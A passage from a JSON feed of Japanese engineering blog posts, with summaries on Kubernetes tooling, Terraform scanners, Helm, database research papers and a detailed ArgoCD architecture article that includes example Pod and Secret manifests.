講座","link":"https://zenn.dev/toshikish/articles/6a06017747cbba","contentSnippet":"これは何Kubernetes クラスタ管理者とアプリケーション開発者が分業しているプロジェクトで，開発者が必ずしも Kubernetes に詳しくない場合を想定し，開発時に使いそうな kubectl のコマンドをまとめたものです。クラスタ管理者から開発者にこのドキュメントを適宜改変して渡し，開発者がある程度自立して操作できるようになることで，管理者への問い合わせ負荷を減らすのが狙いです。場合によってはハンズオンで講座を開いてもよいでしょう。 ドキュメント案ここでは Amazon EKS でクラスタを構築する場合の例を示します。別のインフラに構築している場合は適宜書き換え...","isoDate":"2023-06-19T06:03:18.000Z","dateMiliSeconds":1687154598000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Terraform 静的検査ツール比較","link":"https://zenn.dev/tayusa/articles/9829faf765ab67","contentSnippet":"対象tfsectflintKICSCheckovSnyk tfsechttps://github.com/aquasecurity/tfsechttps://aquasecurity.github.io/tfsec/v1.28.1 特徴CI系公式のdocker imageがあるhttps://github.com/aquasecurity/tfsec#use-with-dockerGitHub Actionがあるhttps://github.com/aquasecurity/tfsec-pr-commenter-actionGitH...","isoDate":"2023-06-15T17:00:00.000Z","dateMiliSeconds":1686848400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"editcap で tcpdump のキャプチャファイルから指定の時間帯を切り出す","link":"https://blog.1q77.com/2023/06/editcap/","contentSnippet":"課題ちょっと大きめ (時間範囲の広い) pcap ファイルがあって、wireshark で見るにしてもちょっと大きすぎるなということがありました。見たい時間帯だけに絞ったファイルにできないかなと思い調べたメモです。","isoDate":"2023-06-15T14:46:42.000Z","dateMiliSeconds":1686840402000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GitHub の Reusable workflow で working-directory に変数を使う","link":"https://zenn.dev/toshikish/articles/be970407f02098","contentSnippet":"やりたいことGitHub Actions の reusable workflow で，作業ディレクトリを入力変数で変えたい場合を考えます。on:  workflow_call:    inputs:      workdir:        required: true        type: string うまくいかない方法ワークフロー全体のステップのデフォルト設定 defaults.run.working-directory では，現時点ではコンテキストと式が許可されていません。したがって，入力変数でディレクトリ名を受け取って上記に入れても動作しません。...","isoDate":"2023-06-15T05:22:24.000Z","dateMiliSeconds":1686806544000,"authorName":"toshikish","authorId":"toshikish"},{"title":"KubeconformをGitLab CIに組み込んで、k8sのマニフェストがAPIの仕様に沿うか検査する","link":"https://zenn.dev/tayusa/articles/1aa96e6ceb838a","contentSnippet":"はじめにk8sマニフェストを普段管理していないメンバーがマニフェストのファイルを変更する場面があります。その際のレビューを出来るだけ自動化したくkubeconformを導入しました。 KubeconformマニフェストがAPIの仕様に沿うか検査してくれます。https://github.com/yannh/kubeconform自分でスキーマを用意すればIstio、Argo Rollouts、Argo Workflowsのような外部のAPIも検査できます。 スキーマの生成スキーマの生成はpythonのスクリプトが用意されているので、これをCRDを引数で渡し実行しま...","isoDate":"2023-06-11T17:19:45.000Z","dateMiliSeconds":1686503985000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"plutoをGitLab CIに組み込んで非推奨のk8s apiVersionを検出する","link":"https://zenn.dev/tayusa/articles/79a3f54d8f21bc","contentSnippet":"はじめにk8sのバージョンが上がるとAPIが再編成されたりアップグレードされたりします。新しいAPIが出ると古いAPIは非推奨になり最終的には削除されます。なので、k8sのバージョンアップ時はDeprecated API Migration Guideなどを見て非推奨のapiVersionが使われていないか確認して時には修正する必要があります。https://kubernetes.io/docs/reference/using-api/deprecation-guide/例CronJob の batch/v1beta1 -> batch/v1 plutoplu...","isoDate":"2023-06-11T17:18:13.000Z","dateMiliSeconds":1686503893000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Istio Canary Upgrade by Helm","link":"https://zenn.dev/tayusa/articles/03cf961e2409bd","contentSnippet":"前提helmfileを利用istioのrevisionTagを利用関係のない設定は省略 Upgradeの前にInstall ディレクトリ構成├── helmfile_istio-base.yaml├── helmfile_istio-ingressgateway.yaml├── helmfile_istiod-1-16-0.yaml└── values    ├── istio-base.yaml    ├── istio-ingressgateway.yaml    └── istiod.yaml helmfile helmfile_isti...","isoDate":"2023-06-11T17:17:37.000Z","dateMiliSeconds":1686503857000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Helmに入門したので、躓いたところを振り返る","link":"https://zenn.dev/tayusa/articles/e9285c6c4c09a1","contentSnippet":"はじめにアプリのマニフェストを管理するのにKustomizeを使っていたのですが、同じようなマニフェストが乱立したので管理を楽にするためにHelmに移行しました。Helmを一から書いたのは初めてだったので、躓いた点をここに残します。 quote関数の進数変換0から始まる数値をquote関数を使って文字列にすると進数変換が起こり想定した値ではなくなる下記のようなtemplateでidとして0000000060のような値を渡すと、8進数として解釈され10進数である48に変換されてしまいます。...id: {{ .id | quote }}...0から始まる数値はtem...","isoDate":"2023-06-11T17:16:25.000Z","dateMiliSeconds":1686503785000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Go言語でNetlinkを少し触った話","link":"https://zenn.dev/bells17/articles/netlink-goexample","contentSnippet":"Go言語でNetlinkを少し触ったのでメモ。具体的にはGo言語でNetlinkというネットワーク関連のライブラリを使ってStatic Routeを設定したりするサンプルを作ったりした。https://github.com/bells17/netlink-gosample Netlinkとは調べた範囲だと、Linuxカーネルのサブシステムの1つで、ルーティングテーブルの管理などのネットワーク関連の設定などを行う際に利用されるもの、という理解をしている。Netlinkは、Linuxカーネルとユーザ空間プロセス間の、またはカーネル内の通信を提供するためのIPC（Inter-pro...","isoDate":"2023-06-08T18:03:10.000Z","dateMiliSeconds":1686247390000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes 1.27 以降のバッチ処理の改善","link":"https://zenn.dev/toversus/articles/d6065bea460871","contentSnippet":"Kubernetes 1.27 以降で実装済みまたは予定されているバッチ処理の改善に繋がる KEP や Kubernetes のサブプロジェクトの現状を見ていきます。 KEP-3673: Kubelet limit of Parallel Image Pulls!Kubernetes 1.27 時点でアルファ機能です。1.28 でベータを目指していますが、設定はデフォルトで無効化されています。Pod の起動にノードのスケールアウトが必要な場合に、Pod の起動時間の短縮が期待できます。バッチ処理の Pod が一斉に起動するケースで恩恵を受けられそうです。Kubelet は...","isoDate":"2023-06-08T03:46:32.000Z","dateMiliSeconds":1686195992000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"asdf の代わりに rtx を使う","link":"https://blog.1q77.com/2023/06/rtx/","contentSnippet":"asdf とはnodeenv とか rbenv とか tfenv とか XXenv がそれぞれ .xxx-version というファイルにそのディレクトリ配下で使用する software の version を指定するという仕様があり、それらをまとめてやってくれる asdf というツールが登場し、.tool-versions というファイルに複数のソフトウェアのバージョンを指定できるようになりました。 (aqua はまだ使ったことがない)","isoDate":"2023-06-07T01:25:11.000Z","dateMiliSeconds":1686101111000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"PC作ってみた","link":"https://moz-security.hatenablog.com/entry/2023/06/04/172414","contentSnippet":"SECCON Beginners CTF 2023 でボコボコにされて、少し萎えていますが、超絶久しぶりにブログでも書きます。なぜ自作PCまず、4月29, 30日（土・日）にGMOインターネットグループが開催するDevSecOpsThon2023というイベントに参加しました。これに関しては、イベント直後に、参加記を書こうと思っていたのですが、書かんといけないな〜と思いながら、2週間も経つと、完全に書く気がなくなりました。気になる方は、下に他の参加者さんが書いたリンクを貼っているのでそちらからご覧ください。イベントの参加者には、自宅サーバ勢が多く、確か半分くらいは、自宅にサーバを立てていたと思います。イベント自体が、インフラハッカソンというちょっと変わったイベントで、ハードウェアやOS、ミドルウェアといった低レイヤの知識を必要としており、もう自宅サーバ勢が無双状態で、自分の知識の欠如を非常に実感しました。そこで、その人たちに近づくための第一歩として、自作PCに取り組もうと思いました。developers.gmo.jpDevSecOpsThon2023 参加ブログ・DevSecOpsThonに参加してきた・「DevSecOpsThon at GMO kitaQ」に参加したらすごく良かった件！！ - Qiita・DevSecOpsThon2023 at GMO kitaQ - Qiita・【\uD83D\uDCDD】DevSecOpsThon at GMO kitaQ\xa0自作PCに取り組むこれに取り組んだのは、5月27, 28日でした。この理由は、25日に給料日だったからですね。まずは、パーツの選択と購入から始めました。別にゲーム用途ではないため、GPUはいらない代わりに、グラフィック機能があるCPUにしたり、メモリの拡張性を考えて、4スロットあるマザーボードにしたりしました。初めての自作PCということで、そこまでスペックのいいものを作る気は最初からなく、まぁ10万円くらいかなと考えていたのですが、メモリやSSDが思ったよりも安く、7万円くらいで全てのパーツを購入することができました。購入したパーツが届いたら、あとは組み立てるだけでした。ググったら、自作PCについてのサイトはたくさん出てきましたが、正直マザーボードとPCケースの取扱説明書だけでも十分なほど説明が細かく書いてあります。全てのパーツをマザーボードにくっつけるだけなので、そこまで難しくはなく、電源など配線が終わったら、本当に起動してくれるのかドキドキしながら、電源ボタンを押しました。プラス端子とマイナス端子を逆にしていないかなど心配しながらも、BIOS画面が立ち上がった時はとても安心したし、嬉しかったです。ここまできたら、あとはブータブルUSBからOSを起動するだけで、無事に初めての自作PCを完成させることができました。今は、仮想マシンを複数台起動していて、それを使って、遊びつつ、勉強していこうと思っています。とりあえずは、Kubernetesクラスタを組んでみたり、脆弱性検証から始めていこうって感じです。自作PCのメモについては、下のリンク先にあります。moz-security.me作ってみて自作PCというと、とてもハードルが高いように感じますが、実際に作ってみると意外と簡単だし、色々と勉強になることもたくさんあります。また、デスクトップという制約はあるものの、同じ値段であれば、ノートPCよりもいいスペックで構築することができるし、店頭にあるデスクトップPCと比べても、自分で改造できるため、拡張性があるといったメリットがあります。一度だけでも作ってみるのはおすすめです。（自分に合わなければ、2度目をなくせばいいだけ）","isoDate":"2023-06-04T08:24:14.000Z","dateMiliSeconds":1685867054000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Redis公式のGoクライアントライブラリrueidisを試してみた","link":"https://qiita.com/bayobayo0324/items/8ac3e27eef360a316ad2","contentSnippet":"This 記事 is 何？Twitterぼんやり見てたらRedis公式のGo用クライアントライブラリが出てたとかで、自身のプロジェクトにどの程度簡単に入れられるのかなーと思い試してみました。公式によると今使っているgo-redisよりも速い！とのことだったので✨基本...","isoDate":"2023-05-31T12:02:25.000Z","dateMiliSeconds":1685534545000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"OLAPデータベースを支える技術","link":"https://zenn.dev/nnaka2992/articles/technics_behind_analytical_database","contentSnippet":"今年に入ってからCarnegie Mellon UniversityのAdvanced Database SystemsでReading Assignmentとして出ている論文リストで必須とされているものや講義資料を読みました。https://nnaka2992.hatenablog.com/archive/category/論文この記事では紹介されていた論文やAdvanced Database Systemsの講義資料・動画を振り替えることで、BigQueryやRedShift、Snowflakeといった最新の分析用データベースがどのように優れたパフォーマンスを実現しているかを考え...","isoDate":"2023-05-25T00:02:49.000Z","dateMiliSeconds":1684972969000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"現在のDremelの実装を解説した論文を読みました ","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/17_dremel","contentSnippet":"この記事の趣旨2020年に発表されたBigQueryの元となったGoogle内で利用されている分析向けデータベースであるDremelの実装を解説した論文を読みました。Dremel: A Decade of Interactive SQL Analysis at Web Scale著者についてSergey Melnik, Andrey Gubarev, Jing Jing Long, Geoffrey Romer, Shiva Shivakumar, Matt Tolton,Theo Vassilakisら2010年のDremel発表論文の著者らと、Hossein Ahmadi, Dan Delorey, Slava Min, Mosha Pasumansky, Jeff ShuteらGoogleで分析ワークロードと分散処理に関わる著者らによる論文。概要BigQueryの元となったGoogleのDremelの10年間を振り替えってアーキテクチャについて説明した論文。Dremelは現代のクラウドネイティブ分析ツールで一般的になっている、計算リソースとストレージの分解、カラムナストレージ、in situデータ分析などを統合した最初のツールである。手法SQLの採用Googleでは殆どのデータはBigTableなどNoSQLデータベースで管理されていたため、SQLを用いないデータアクセスが主流であった。しかしトランザクション型ビッグデータシステムにおける、SQLの採用に共ないDremelでもSQLを採用した。ストレージの分離メモリの分離MapReduceのシャッフルのボトルネックを回避するためにDisaggregated Memory Shuffle Systemを採用した。In situデータ分析への対応DBMSへのデータロードを必要としないデータ分析のことで、DremelではGFSに移行するときにGoogle内で共有のストレージフォーマットを使用することでGoogle内のデータに対応した。加えてGoogle Cloud StorageやGoogle Drive、MySQL、BigTableなどからのデータ取得もフェデレーションとして対応した。サーバレスアーキテクチャフォールトトレラントリスタート、仮想スケジューリングユニットによりマルチテナントかつオンデマンドなリソースを提供可能とし、低価格な利用を可能とした。現在ではサーバレスアーキテクチャを進化させ、集中型スケジューリングやShuffle Persistent Layer、柔軟なDAG実行、動的クエリ実行などを実装することでより優れたサーバレスアーキテクチャを実現した。ネストデータにおけるカラムナストレージ[[32])]Figure 5Figure 6Figure 7クエリレイテンシの最小化インタラクティブな実行のレイテンシは大きくなる。それを解決するためにDremelではスタンバイサーバプール、マルチレベル実行ツリー、列指向スキーマ表現、CPUとIO負荷のバランス調整、ファイルオペレーションの再利用、保証されたキャパシティ、適合的なクエリスケーリングにより実現している。作業時間read27:5027:50author32:024:12summary68:5026:48","isoDate":"2023-05-15T02:14:20.000Z","dateMiliSeconds":1684116860000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Connection draining for Service type LoadBalancer","link":"https://zenn.dev/toversus/articles/1682d275ef1bb7","contentSnippet":"はじめにService リソースは Kubernetes のサービス検出を支えるコアリソースです。Service のデータプレーンとして kube-proxy を使用している場合は、各ノード上の iptables や ipvs を設定することで L4 負荷分散を実現しています。Kubernetes は、結果整合性 (Eventual Consistency) の上に成り立つ分散システムです。Kubernetes のコントロールプレーンが Pod を削除する時に、全てのノード上のルーティングルールを更新してから Pod を削除したりはしません。削除中の Pod にもトラフィックが流...","isoDate":"2023-05-11T09:43:47.000Z","dateMiliSeconds":1683798227000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"TiDBで学ぶNewSQLのアーキテクチャ for Beginners","link":"https://zenn.dev/nnaka2992/articles/learning_tidb_internal_for_beginner","contentSnippet":"はじめにこの記事ではNewSQLの特徴であるノード間の分散とトランザクションや分断耐性などがTiDBではどのような技術によって実現されているかを説明することを目的としています。Spannerの論文が2012年に発表されてから10年以上の年月が流れ、優れた論文や実装ドキュメント、個人による解説ブログなど技術的詳細について述べた資料は多くあります。加えてこの記事を入門的なものと位置づけているため各コンポーネントを網羅的に解説するというよりは、キーコンセプトをどのように実装しているのかを実験を混じえながら動作の実現方法の解説を中心に扱います。また今回はTiDBをベースに説明し...","isoDate":"2023-05-11T01:18:19.000Z","dateMiliSeconds":1683767899000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"クエリオプティマイザの精度を検証した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/16_query_optimization_performance","contentSnippet":"この記事の趣旨2015年に発表されたクエリオプティマイザにおけるカーディナリティ推定とコストモデル、列挙アルゴリズムの貢献度を評価した論文を読んでいきます。How Good Are Query Optimizers, Really?著者についてViktor Leis、Andrey Gubichev、Atanas Mirchev、Peter Boncz、Alfons Kemper、Thomas Neumannらのグループによる論文。ほとんどのメンバーはDBMSにおける最適化について研究しているが、Atanas Mirchevはより統計や探索といった最適化よりの研究をしている。問題意識良い結合順序を見つけることはクエリの性能に対して大きな影響を与えるため、熱心に研究されてきた。古典的なクエリ最適化のアプローチでは以下のステップで動的計画方に基づいた最適化を行なう。1. 有効な結合順序の列挙1. カーディナリティ推定値を入力としたコストモデルの選択理論的にはカーディナリティとコストモデルの推定値が正確であれば、最適なクエリプランを選択することができる。しかし現実にはカーディナリティ推定は一様性や独立性といった単純化された仮定に基づいており、しばしばそのような仮定は間違っているため悲惨な計画を作成する。手法この論文ではカーディナリティ推定器の評価と正確なコストモデルの重要性の評価、そして列挙された結合順序の空間がどの程度影響するのかを以下の方法で検証し、貢献を行なっている。1. IMDBデータを用いたJoin Order BenchmarkというJOINにフォーカスしたベンチマークによる評価を行なう1. 実世界のデータセットにおける現実的なクエリを用いたE2Eの検証を行なう。1. クエリ性能に対するカーディナリティ・コストモデル・列挙アルゴリズムの貢献度を定量化し、最適なクエリプラン生成のためのガイドラインを策定している。作業時間read29:3829:38author33:083:30summary48:4414:36感想時間が無くまとめ途中で切り上げてしまった。やらないよりマシではあるものの、ちゃんと纏めるときにくらべて理解度に影響が出そうなので時間に余裕を持っておきたい。内容自体はGW中にPostgreSQLの実装を読んでいたこともあり、わりと理解しやすかった。","isoDate":"2023-05-08T02:13:43.000Z","dateMiliSeconds":1683512023000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[Kubernetes 1.27] Dynamic Resource Allocation のいま","link":"https://zenn.dev/toversus/articles/fe2aa06f133b49","contentSnippet":"!Kubernetes 1.27 時点でアルファ機能のため、実装が大きく変わる可能性があります。 はじめにKubeCon Europe 2023 で KEP-3063 Dynamic Resource Allocation (DRA) についての深い話と DRA Resource Driver の実装方法の話があったので、kubernetes-sigs/dra-example-driver をベースに触りながら検証してみました。toVersus/fake-dra-driver で公開しています。Device Plugins 2.0: How to Build a Drive...","isoDate":"2023-05-06T02:11:55.000Z","dateMiliSeconds":1683339115000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"【ArgoCD\uD83D\uDC19】ArgoCDのマイクロサービスアーキテクチャと自動デプロイの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/05/02/145115","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️ArgoCDのアーキテクチャを構成するコンポーネントの種類についてArgoCDがマニフェストを自動デプロイする仕組みについてこの記事から得られる知識01. はじめに02. 概要アーキテクチャレイヤーコンポーネント仕組み(1) repo-serverによるクローン取得(2) application-controllerによるマニフェスト取得(3) application-controllerによるCluster確認(4) application-controllerによる処理結果保管(5) argocd-serverによるキャッシュ取得(6) 管理者のログイン(7) IDプロバイダーへの認証フェーズ委譲(8) dex-serverによる認証リクエスト送信(9) argocd-serverによる認可フェーズ実行(10) application-controllerによるマニフェストデプロイ03. repo-serverrepo-serverとは仕組み(1) InitContainerによるお好きなツールインストール & argocd-cliバイナリコピー(2) repo-serverによる認証情報取得(3) repo-serverのよるクローン取得とポーリング(4) repo-serverによるサイドカーコール(5) repo-serverによる暗号化キーと暗号化変数の取得(6) サイドカーによるプラグイン処理の取得(7) サイドカーによるプラグイン処理の実行04. application-controller、redis-serverapplication-controllerとはredis-serverとは仕組み(1) ArgoCD用Cluster管理者のkubectl applyコマンド(2) application-controllerによるArgoCD系カスタムリソースのReconciliation(3) application-controllerによるマニフェスト取得(4) application-controllerによるヘルスチェック(5) application-controllerによるマニフェスト差分検出(6) application-controllerによる処理結果保管(7) application-controllerによるマニフェストデプロイ05. dex-serverdex-serverとは仕組み(1) プロダクト用Cluster管理者のログイン(2) IDプロバイダーへの認証フェーズ委譲(3) dex-serverによる認可リクエスト作成(4) dex-serverによる認可リクエスト送信(5) IDプロバイダーによる認証フェーズ実施(6) argocd-serverによる認可フェーズ実施06. argocd-server (argocd-apiserver)argocd-serverとは仕組み(1) application-controllerによるヘルスチェック(2) application-controllerによるマニフェスト差分検出(3) application-controllerによる処理結果保管(4) application-controllerによる処理結果取得(5) プロダクト用Cluster管理者のログイン(6) Ingressコントローラーによるルーティング(7) IDプロバイダーへの認証フェーズ委譲(8) IDプロバイダーによる認証フェーズ実施(9) argocd-serverによる認可フェーズ実施(10) application-controllerによるマニフェストデプロイ07. アーキテクチャのまとめ08. おわりに謝辞記事関連のおすすめ書籍01. はじめにロケットに乗るタコのツラが腹立つわー。画像引用元：Argo Projectさて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、全プロダクト共有のArgoCD\uD83D\uDC19とAWS EKSをリプレイスしました。今回は、採用した設計プラクティスの紹介も兼ねて、ArgoCDのマイクロサービスアーキテクチャと自動デプロイの仕組みを記事で解説しました。ArgoCDは、kubectlコマンドによるマニフェストのデプロイを自動化するツールです。ArgoCDのアーキテクチャには変遷があり、解説するのは執筆時点 (2023/05/02) で最新の 2.6 系のArgoCDです。アーキテクチャや仕組みはもちろん、個々のマニフェストの実装にもちょっとだけ言及します。それでは、もりもり布教していきます\uD83D\uDE1702. 概要アーキテクチャレイヤーまずは、ArgoCDのアーキテクチャのレイヤーがどのようになっているかを見ていきましょう。ArgoCD公式から、コンポーネント図が公開されています。図から、次のようなことがわかります\uD83D\uDC47下位レイヤー向きにしか依存方向がなく、例えばコアドメインとインフラのレイヤー間で依存性は逆転させていない。レイヤーの種類 (UI、アプリケーション、コアドメイン、インフラ) とそれらの依存方向から、レイヤードアーキテクチャのようなレイヤーに分けている。特にコアドメインレイヤーが独立したコンポーネントに分割されており、マイクロサービスアーキテクチャを採用している。argo-cd/docs/developer-guide/architecture/components.md at v2.8.0 \xb7 argoproj/argo-cd \xb7 GitHub▶ ArgoCDのマイクロサービスアーキテクチャの分割単位についてMonolith to Microservices: Evolutionary Patterns to Transform Your Monolith (English Edition)▶ ArgoCDのマイクロサービスアーキテクチャの設計図についてhttps://microsoft.github.io/code-with-engineering-playbook/design/diagram-types/DesignDiagramsTemplates/componentDiagrams/コンポーネント次に、コンポーネントの種類を紹介します。ArgoCDの各コンポーネントが組み合わさり、マニフェストの自動的なデプロイを実現します。ArgoCD (2.6系) のコンポーネントはいくつかあり、主要なコンポーネントの種類とレイヤーは以下の通りです\uD83D\uDC47 コンポーネント                       レイヤー              機能                                                                                                                                                                                                             argocd-server(argocd-apiserver)  UI・アプリケーション  みんながよく知るArgoCDのダッシュボードです。また、ArgoCDのAPIとしても機能します。現在、複数のレイヤーの責務を持っており、将来的にUIとアプリケーションは異なるコンポーネントに分割されるかもしれません。  application-controller               コアドメイン          Clusterにマニフェストをデプロイします。また、ArgoCD系カスタムリソースのカスタムコントローラーとしても機能します。                                                                                            repo-server                          コアドメイン          マニフェスト/チャートリポジトリからクローンを取得します。また、クローンからマニフェストを作成します。                                                                                                        redis-server                         インフラ              application-controllerの処理結果のキャッシュを保管します。                                                                                                                                                       dex-server                           インフラ              SSOを採用する場合、argocd-serverの代わりに認可リクエストを作成し、またIDプロバイダーに送信します。これにより、argocd-server上の認証フェーズをIDプロバイダーに委譲できます。                                 GitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux以降の図の凡例です。ArgoCDの各コンポーネント (application-controller、argocd-server、dex-server、repo-server) と各リソース (Application、AppProject) を区別しています。仕組みそれでは、ArgoCDは、どのようにコンポーネントを組み合わせて、マニフェストをデプロイするのでしょうか。ここではプロダクト用Cluster管理者 (デプロイ先となるClusterを管理するエンジニア) は、ArgoCDのダッシュボードを介してマニフェストをデプロイするとしましょう。まずは、概要を説明していきます。(1) repo-serverによるクローン取得ArgoCDのCluster上で、repo-serverがマニフェスト/チャートリポジトリのクローンを取得します。(2) application-controllerによるマニフェスト取得application-controllerは、repo-serverからマニフェストを取得します。(3) application-controllerによるCluster確認application-controllerは、プロダクト用Clusterの現状を確認します。(4) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。(5) argocd-serverによるキャッシュ取得argocd-serverは、redis-serverからキャッシュを取得します。(6) 管理者のログインプロダクト用Cluster管理者は、argocd-serverにログインしようとします。(7) IDプロバイダーへの認証フェーズ委譲argocd-serverは、ログイン時にIDプロバイダーに認証フェーズを委譲するために、dex-serverをコールします。▶ argocd-serverのログイン手法について(8) dex-serverによる認証リクエスト送信dex-serverは、IDプロバイダーに認可リクエストを作成し、これをIDプロバイダーに送信します。(9) argocd-serverによる認可フェーズ実行argocd-serverで認可フェーズを実施します。ログインが完了し、プロダクト用Cluster管理者は認可スコープに応じてダッシュボードを操作できます。▶ ArgoCDをどのClusterで管理するかについて(10) application-controllerによるマニフェストデプロイapplication-controllerは、Clusterにマニフェストをデプロイします。マニフェストのデプロイの仕組みをざっくり紹介しました。ただこれだと全く面白くないため、各コンポーネントの具体的な処理と、各々がどのように通信しているのかを説明します✌️03. repo-serverrepo-serverとはまずは、コアドメインレイヤーにあるrepo-serverです。マニフェスト/チャートリポジトリ (例：GiHub、GitHub Pages、Artifact Hub、AWS ECR、Artifact Registryなど) からクローンを取得します。repo-serverを持つPodには、他に軽量コンテナイメージからなるInitContainerとサイドカー (cmp-server) がおり、それぞれ機能が切り分けられています\uD83D\uDC4D仕組み(1) InitContainerによるお好きなツールインストール & argocd-cliバイナリコピーrepo-serverの起動時に、InitContainerでお好きなマニフェスト管理ツール (Helm、Kustomizeなど) やプラグイン (helm-secrets、KSOPS、SOPS、argocd-vault-pluginなど) をインストールします。また、サイドカーのcmp-serverでは起動時に/var/run/argocd/argocd-cmp-serverコマンドを実行する必要があり、InitContainer (ここではcopyutilコンテナ) を使用して、ArgoCDのコンテナイメージからargocd-cliのバイナリファイルをコピーします。repo-serverのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、ArgoCDで使いたいツール (Helm、SOPS、helm-secrets) をInitContainerでインストールしています。apiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: argocdspec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest  initContainers:    # HelmをインストールするInitContainer    - name: helm-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /custom-tools          name: custom-tools    # SOPSをインストールするInitContainer    - name: sops-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /custom-tools          name: custom-tools    # helm-secretsをインストールするInitContainer    - name: helm-secrets-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /helm-working-dir/plugins          name: helm-working-dir    ...    # cmp-serverにargocd-cliのバイナリをコピーするInitContainer    - name: copyutil      image: quay.io/argoproj/argocd:latest      command:        - cp        - -n        - /usr/local/bin/argocd        - /var/run/argocd/argocd-cmp-server      volumeMounts:        - name: var-files          mountPath: /var/run/argocd  # Podの共有ボリューム  volumes:    - name: custom-tools      emptyDir: {}    - name: var-files      emptyDir: {}Custom Tooling - Argo CD - Declarative GitOps CD for Kubernetes▶ ArgoCDのコンテナイメージに組み込まれているツールについてquay.io/argoproj/argocd) には、いくつかのツール (例：Helm、Kustomize、Ks、Jsonnetなど) の推奨バージョンがあらかじめインストールされています。そのため、これらのツールのプラグイン (例：helm-secrets) を使用する場合、上記のコンテナイメージからなるrepo-server内のツールをcmp-serverにコピーすればよいのでは、と思った方がいるかもしれません。この方法は全く問題なく、cmp-serverの/usr/local/binディレクトリ配下にツールをコピーするように、InitContainerを定義してもよいです。apiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: foospec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest      volumeMounts:        - mountPath: /usr/local/bin/helm          # Podの共有ボリュームを介して、repo-serverでHelmを使用する。          name: custom-tools  initContainers:    - name: copy-helm      image: quay.io/argoproj/argocd:latest      # InitContainer上のHelmをVolumeにコピーする      command:        - /bin/cp        - -n        - /usr/local/bin/helm        - /custom-tools/helm      volumeMounts:        - mountPath: /custom-tools          name: custom-tools  # 共有ボリューム  volumes:    - name: custom-tools      emptyDir: {}反対に、これらツールをInitContainerでインストールし直す場合は、ArgoCD上での推奨バージョンをちゃんとインストールするようにしましょう\uD83D\uDC4D2.6系では、ArgoCDのリポジトリ内のtool-versions.shファイルに、Helmのバージョンが定義されています。spec:  ...  initContainers:    - name: helm-installer      image: alpine:latest      command:        - /bin/sh        - -c      # ArgoCDのリポジトリ上のtool-versions.shファイルから、Helmのバージョンを取得する      args:        - |          apk --update add curl wget          ARGOCD_VERSION=$(curl -s https://raw.githubusercontent.com/argoproj/argo-helm/argo-cd-<ArgoCDのバージョン>/charts/argo-cd/Chart.yaml | grep appVersion | sed -e \'s/^[^: ]*: //\')          HELM_RECOMMENDED_VERSION=$(curl -s https://raw.githubusercontent.com/argoproj/argo-cd/\\"${ARGOCD_VERSION}\\"/hack/tool-versions.sh | grep helm3_version | sed -e \'s/^[^=]*=//\')          wget -q https://get.helm.sh/helm-v\\"${HELM_RECOMMENDED_VERSION}\\"-linux-amd64.tar.gz          tar -xvf helm-v\\"${HELM_RECOMMENDED_VERSION}\\"-linux-amd64.tar.gz          cp ./linux-amd64/helm /custom-tools/          chmod +x /custom-tools/helm      volumeMounts:        - mountPath: /custom-tools          name: custom-tools  ...argo-cd/hack/tool-versions.sh at v2.6.0 \xb7 argoproj/argo-cd \xb7 GitHub(2) repo-serverによる認証情報取得repo-serverは、Secret (argocd-repo-creds) からリポジトリの認証情報を取得します。argocd-repo-credsではリポジトリの認証情報のテンプレートを管理しています。指定した文字列から始まる (前方一致) URLを持つリポジトリに接続する場合、それらの接続で認証情報を一括して適用できます。argocd-repo-credsのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、リポジトリのSSH公開鍵認証を採用し、argocd-repo-credsに共通の秘密鍵を設定しています。apiVersion: v1kind: Secretmetadata:  name: argocd-repo-creds-github  namespace: argocd  labels:    argocd.argoproj.io/secret-type: repo-credstype: Opaquedata:  type: git  url: https://github.com/hiroki-hasegawa  # 秘密鍵  sshPrivateKey: |    MIIC2 ...あとは、各リポジトリのSecret (argocd-repo) にURLを設定しておきます。すると、先ほどのargocd-repo-credsのURLに前方一致するURLを持つSecretには、一括して秘密鍵が適用されます。# foo-repositoryをポーリングするためのargocd-repoapiVersion: v1kind: Secretmetadata:  namespace: argocd  name: foo-argocd-repo  labels:    argocd.argoproj.io/secret-type: repositorytype: Opaquedata:  # 認証情報は設定しない。  # チャートリポジトリ名  name: bar-repository  # https://github.com/hiroki-hasegawa に前方一致する。  url: https://github.com/hiroki-hasegawa/bar-chart.git---# baz-repositoryをポーリングするためのargocd-repoapiVersion: v1kind: Secretmetadata:  namespace: 